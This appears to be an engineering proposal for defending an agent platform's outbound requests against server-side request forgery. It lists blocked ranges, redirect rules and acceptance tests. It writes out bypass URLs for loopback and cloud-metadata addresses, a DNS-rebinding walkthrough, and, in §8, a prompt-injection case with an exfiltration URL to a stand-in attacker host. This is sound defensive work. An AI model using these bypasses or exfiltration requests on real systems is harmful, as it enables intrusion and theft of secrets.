# Outbound network security

> Proposal, 2026-11-01, revision 3. Refinement item 2.

AgentWorld makes outbound HTTP requests to addresses its users supply. That is not an
incidental feature — it is `agent_push`, `webhook_emit`, the `http_request` tool, MCP
server connections and knowledge fetching. Every one of them is a server-side request
forgery vector, and a URL deny-list does not close any of them properly.

This document is the security boundary: what AgentWorld guarantees, what the deployment
must provide, and what neither can prevent.

## 1. Why a deny-list is the wrong primitive

Revision 2 said "the URL is validated against a deny-list of loopback, link-local and
private ranges". Four ways that fails, each a known technique rather than a hypothetical:

**It validates a name, then connects to an address.** `http://internal.example.com/`
passes any string check. What matters is what the name *resolves to*, and resolution
happens inside the HTTP client after validation has finished.

**DNS rebinding.** An attacker controls `evil.test` and answers the first query with a
public address and the second with `10.0.0.5`. Validation resolves it, sees the public
address, approves; the client resolves it again to connect and gets the internal one. A
one-second TTL is all that is required.

**Time-of-check to time-of-use.** Even without malice, a DNS record can change between
validation and connection. The window is small and entirely sufficient.

**Redirects.** `https://public.test/x` is fine and returns `302 Location:
http://169.254.169.254/latest/meta-data/`. The client follows it by default, and no
validation runs on the hop.

And the one that catches careful implementations: **IPv4-mapped IPv6**.
`http://[::ffff:169.254.169.254]/` is the metadata endpoint written as an IPv6 address.
Range checks written for IPv4 alone see an IPv6 literal and pass it through.

## 2. The primitive: resolve, validate every address, then pin

One technique removes the first four problems together.

```
1. Parse the URL. Reject non-http/https schemes outright.
2. Resolve the host to every address it has (A and AAAA).
3. Validate EVERY resolved address against the blocked set.
   One bad address fails the whole request — not "pick a good one",
   because a round-robin answer would then pass intermittently.
4. Connect to a validated IP ADDRESS, carrying the original Host
   header and SNI so TLS and virtual hosting still work.
5. Never resolve again for this request.
```

Step 4 is the whole thing. The connection is made to an address that has already been
checked, so there is no second resolution to poison: **DNS rebinding and the
check-to-use window are both closed by construction**, not by shortening a race.

In Python this is a custom `httpx` transport that overrides address resolution — a
resolver that returns the pre-validated address. The same transport is used by every
outbound caller, so there is one place to review and one place that can be wrong:

```python
# infra/net/guarded.py
def guarded_client(policy: EgressPolicy) -> httpx.AsyncClient:
    """The only HTTP client any outbound caller may construct."""
```

*Enforced, not asked for:* an import-linter contract forbids `httpx.AsyncClient` outside
`infra/net/`, so a worker or tool that builds its own client fails CI. The one exception
is `infra/auth/supabase.py`, whose JWKS URL is operator configuration rather than user
input, and it is named explicitly in the contract.

## 3. The blocked set

Both families, and the special cases that are usually missed.

### IPv4

| Range | What it is |
|-------|-----------|
| `0.0.0.0/8` | "this host" |
| `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` | private (RFC 1918) |
| `127.0.0.0/8` | loopback — the whole `/8`, not just `127.0.0.1` |
| `169.254.0.0/16` | link-local, which contains **`169.254.169.254`**, the cloud metadata address |
| `100.64.0.0/10` | carrier-grade NAT (RFC 6598) |
| `192.0.0.0/24`, `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24` | IETF protocol assignments and documentation |
| `198.18.0.0/15` | benchmarking |
| `224.0.0.0/4` | multicast |
| `240.0.0.0/4`, `255.255.255.255/32` | reserved and broadcast |

### IPv6

| Range | What it is |
|-------|-----------|
| `::/128` | unspecified |
| `::1/128` | loopback |
| `fe80::/10` | link-local, including **`fd00:ec2::254`** on AWS |
| `fc00::/7` | unique local |
| `::ffff:0:0/96` | **IPv4-mapped.** Every IPv4 rule above applies again here, and this is the most common bypass |
| `64:ff9b::/96`, `64:ff9b:1::/48` | NAT64 — another way to express an IPv4 destination |
| `2002::/16` | 6to4 |
| `2001::/32` | Teredo |
| `100::/64` | discard-only |
| `ff00::/8` | multicast |

The IPv4-mapped and NAT64 rows are why the check is written as *"normalise to a canonical
address, then test"* rather than as two separate range lists. `ipaddress.ip_address()`
followed by unmapping, then one membership test per family.

### Cloud metadata, by name as well as by address

Addresses are covered by link-local above. Names are not, and several providers publish
one:

| Name | Provider |
|------|----------|
| `metadata.google.internal` | Google Cloud |
| `metadata.goog` | Google Cloud |
| `instance-data` | AWS (legacy) |
| `metadata.azure.com` | Azure |
| `100.100.100.200` | Alibaba (inside CGNAT, so already blocked by range) |

These are blocked by name as well, before resolution, because a provider may resolve them
through a mechanism that is not plain DNS.

### Also blocked

- **Non-`http`/`https` schemes.** `file://`, `gopher://`, `dict://`, `ftp://` and
  `redis://` are the classic protocol-smuggling vectors. An allow-list of two schemes,
  not a deny-list of the rest.
- **Credentials in the URL** (`http://user:pass@host/`) — refused, because they would be
  logged and are not how a credential reaches an outbound call here.
- **Non-standard ports**, by default: 80, 443 and 8443 are allowed, and anything else
  needs the deployment to widen the policy. Arbitrary ports are how internal service
  discovery is done.

## 4. Redirects

**Redirects are never followed automatically.** `follow_redirects=False` on the guarded
client, always.

A caller that wants them opts in, and then **each hop is treated as a new request**: the
`Location` is parsed, its host is resolved **independently**, every resolved address is
validated, and the connection is pinned to a validated one. The first hop's validation
grants the second nothing — a redirect chain is not a trusted channel.

A cap of three hops, and the scheme may not downgrade from `https` to `http`. A redirect to
a blocked destination is a terminal error, not a retryable one: the destination will not
become allowed by waiting.

`agent_push` and `webhook_emit` do not opt in. A `302` from a webhook receiver is a
misconfiguration on their side, and following it would mean posting the work somewhere the
user never named.

## 5. Internal service discovery, and the limits of application-level checks

The checks above stop a request reaching an internal address. They do **not** stop an
attacker *learning about* the internal network, because the difference between
"connection refused in 1ms" and "timed out after 10s" is information even when both are
failures.

Three mitigations, and the third is the only real one:

**Normalised errors.** Every outbound failure becomes one of a small fixed set —
`blocked_destination`, `unreachable`, `timeout`, `tls_failure`, `http_error` — with no
response body, no header, no resolved address and no upstream error text reaching the step
output, the event payload or the model's context. An attacker gets the same answer from a
blocked address as from one that does not exist.

**Constant-time rejection.** A destination blocked by §3 fails *before any connection is
attempted*, so there is no timing difference between a blocked internal host and a blocked
reserved range.

**Network-level egress policy — the actual boundary.** Application validation is defence
in depth. The protection that holds even if `infra/net/` has a bug is that the worker
processes cannot route to the internal network at all:

| Deployment | Mechanism |
|-----------|-----------|
| Kubernetes | a `NetworkPolicy` on the worker pods allowing egress to `0.0.0.0/0` **except** the cluster CIDR, the node CIDR and `169.254.0.0/16`, plus DNS to the cluster resolver only |
| AWS (ECS/EC2) | workers in a private subnet whose route to the internet is a NAT gateway; security groups with no egress to the VPC CIDR; **IMDSv2 required and the hop limit set to 1**, which alone defeats metadata access from a container |
| Docker Compose (self-host) | workers on a dedicated network with no route to other service networks; the documented minimum |
| Bare metal | documented as **not protected** at this layer. Application validation is all there is, and the self-hosting guide says so |

That table is the security boundary, and the last row is the point of writing it down: a
self-hoster running workers on a box that can reach their internal network is relying
entirely on `infra/net/`, and should know that rather than assume a second layer exists.

## 6. Other outbound limits

Not SSRF, but the same client enforces them because the same code path is where they
belong:

| Limit | Default | Why |
|-------|---------|-----|
| Connect timeout | 5s | a hung connect holds a lease |
| Total timeout | 30s (tools), 10s (`agent_push`) | bounds a step |
| Response body | 10 MB, streamed and truncated | a tool returning 2 GB into a model's context is an availability and cost problem |
| Response → model context | 100 KB after truncation | the model never sees more than it can use |
| Concurrent outbound per workspace | 20 | one tenant cannot saturate the egress path |
| Redirect hops | 3, opt-in only | §4 |
| TLS | verification always on; no opt-out, no custom CA from user input | a user-supplied CA bundle is a user-supplied trust decision |

## 7. Where the guarded client is used

| Caller | User-supplied destination? | Guarded | Notes |
|--------|--------------------------|---------|-------|
| `http_request` builtin tool | **yes, fully** | yes | the highest-risk surface: a model chooses the URL |
| `agent_push` | yes (`agents.dispatch.url`) | yes | validated at save time *and* at request time |
| `webhook_emit` | yes (`webhooks.url`) | yes | |
| MCP server connection | yes (`integrations.config.url`) | yes | long-lived; re-validated on reconnect |
| Knowledge `url` source | yes | yes | |
| OAuth authorize/token | no — from the provider registry | yes, for uniformity | operator-defined, but routed through one client |
| Model provider API | no — from the provider registry | yes | same |
| Supabase JWKS | no — operator configuration | **exempt, named in the contract** | runs before any tenant context exists |

"Validated at save time *and* at request time" matters: save-time validation is a usability
feature, telling the user immediately that their URL will not work. Request-time
validation is the security control. A record that resolves publicly today and privately
tomorrow is caught by the second, which is the only one that counts.

## 8. What this does not protect against

Stated because a boundary document that only lists wins is not a boundary document.

- **A genuinely public endpoint that an agent should not reach.** If a user grants an agent
  `http_request`, it can call any public API. That is the capability working as intended;
  the controls are the tool grant, the `consequential` classification and the approval gate
  — not the network layer.
- **Data exfiltration through an allowed destination.** An agent with `http_request` and
  access to knowledge can `POST` that knowledge to a public URL. Mitigated by grant
  scoping and approvals, not by egress rules.
- **A compromised MCP server.** Connecting one is trusting it, and it is reached over the
  public internet legitimately. The mitigation is that MCP tools are classified like any
  other and `consequential` ones are gated.
- **Prompt injection choosing the URL.** A model told by a malicious document to fetch
  `http://internal/` is stopped by §2 — but a model told to fetch
  `https://attacker.test/?data=<secrets>` is not, because that destination is allowed. This
  is the unresolved risk named in `07-DECISION-RECORD.md` §5.

## 9. Acceptance criteria

Each is a test. The parametrised ones run the whole table, not a sample.

All of the following are **automated** and run in CI, parametrised over the tables above
rather than over a sample. The list is the one the final clarification asked for, plus the
cases that were already here.

**Address normalisation and validation**
- [ ] Every range in §3 is refused, for both families, parametrised one case per row.
- [ ] IPv4 and IPv6 normalisation: each address is canonicalised before testing, so
      `10.0.0.1`, `::ffff:10.0.0.1`, `::ffff:a00:1` and `64:ff9b::a00:1` are all recognised
      as the same blocked destination.
- [ ] `http://[::ffff:169.254.169.254]/` and `http://[::ffff:10.0.0.1]/` are refused.
- [ ] `http://[64:ff9b::a00:1]/` (NAT64-wrapped `10.0.0.1`) is refused.
- [ ] `http://127.1/`, `http://2130706433/`, `http://0x7f.0.0.1/` — decimal, hex and short
      forms of loopback — are all refused, because normalisation happens before testing.
- [ ] **Mixed DNS answers:** a hostname resolving to one public and one private address is
      refused outright, not partially allowed and not resolved to "the good one".
- [ ] A hostname resolving to several public addresses connects to one of them.
- [ ] `file://`, `gopher://`, `dict://` and `ftp://` are refused on scheme alone.
- [ ] A URL carrying userinfo is refused.
- [ ] Port 22 and port 6379 are refused under the default port policy.
- [ ] Each metadata hostname in §3 is refused by name, with resolution stubbed to a public
      address so the name check is what fails it.

**DNS rebinding and pinning**
- [ ] With a resolver that returns a public address on the first call and `10.0.0.5` on the
      second, the request still connects to the first — proving the address is pinned and
      not re-resolved. This is the DNS-rebinding case.
- [ ] A resolver whose answer changes between the validation call and the connect call
      cannot affect the connection, because there is no second call — asserted with a
      resolver spy that records exactly one lookup per request.
- [ ] **Host and SNI preservation:** the `Host` header and TLS SNI carry the original
      hostname when connecting by IP, so a virtual-hosted HTTPS endpoint still works.
      Asserted against a real TLS test server, not a mock.

**Redirects**
- [ ] A `302` to `http://169.254.169.254/` is not followed, under both the default and the
      opt-in policy.
- [ ] **Each hop is independently resolved and validated:** a `302` from an allowed host to
      a hostname that resolves to `10.0.0.5` is refused, proving the first hop's validation
      did not carry over.
- [ ] A redirect hop is also pinned: a resolver returning public-then-private for the
      *redirect target* still connects to the first answer.
- [ ] A fourth redirect hop is refused.
- [ ] An `https` → `http` redirect is refused.
- [ ] `agent_push` and `webhook_emit` do not follow a `302` at all.

**Error normalisation**
- [ ] A blocked destination, a non-existent host and a refused connection produce
      indistinguishable step output, event payload and problem document — differing only in
      the server-side log.
- [ ] No upstream response body, header or resolved address appears in any step output,
      event payload or model context.
- [ ] A blocked destination is rejected with no connection attempt, measured by a resolver
      and socket spy.

**Limits**
- [ ] A 50 MB response is truncated at 10 MB and the step reports truncation.
- [ ] A hung connect fails at the connect timeout without holding a dispatch lease past
      it.
- [ ] The 21st concurrent outbound request in one workspace queues rather than running.

**Structural**
- [ ] `httpx.AsyncClient` is constructed nowhere outside `infra/net/`, except the named
      Supabase exemption — the import-linter contract, verified by planting a violation.
- [ ] Save-time validation and request-time validation call the same function, asserted by
      there being one.
